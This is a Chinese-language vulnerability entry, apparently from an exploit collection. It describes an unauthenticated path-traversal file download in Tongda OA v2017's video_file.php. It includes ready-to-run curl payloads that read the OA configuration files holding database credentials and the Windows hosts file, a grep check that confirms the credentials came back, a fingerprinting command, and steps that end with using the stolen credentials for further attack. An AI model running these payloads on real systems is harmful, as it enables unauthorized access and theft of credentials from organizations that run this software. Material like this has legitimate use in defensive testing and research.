---
id: TONGDA-V2017-FILE-READ
title: 通达OA v2017 video_file.php 任意文件下载漏洞
product: tongda-oa
vendor: 通达信科
version_affected: "通达OA v2017"
severity: HIGH
tags: [file_read, path_traversal, 无需认证, 国产, oa]
fingerprint: ["通达OA", "TDXK", "Office Anywhere"]
---

## 漏洞描述

通达OA v2017 的 video_file.php 文件存在路径穿越导致的任意文件下载漏洞，攻击者无需认证即可通过 MEDIA_DIR 和 MEDIA_NAME 参数读取服务器上的任意文件，包括 OA 配置文件中的数据库凭据。

## 影响版本

- 通达OA v2017

## 前置条件

- 无需认证
- 目标运行通达OA v2017

## 利用步骤

1. 确认目标为通达OA
2. 通过路径穿越构造 MEDIA_DIR 参数
3. 读取 oa_config.php 获取数据库凭据
4. 利用获取的凭据进一步攻击

## Payload

```bash
# 读取 OA 配置文件（数据库凭据）
curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"

# 读取 inc/td_config.php
curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=td_config.php"

# 读取 Windows hosts 文件
curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../../../../../windows/system32/drivers/etc/&MEDIA_NAME=hosts"
```

## 验证方法

```bash
# 读取 oa_config.php 检查是否包含数据库配置
curl -s "http://target/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php" | grep -i "db_\|mysql\|password"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "通达\|Office Anywhere\|TDXK"
```
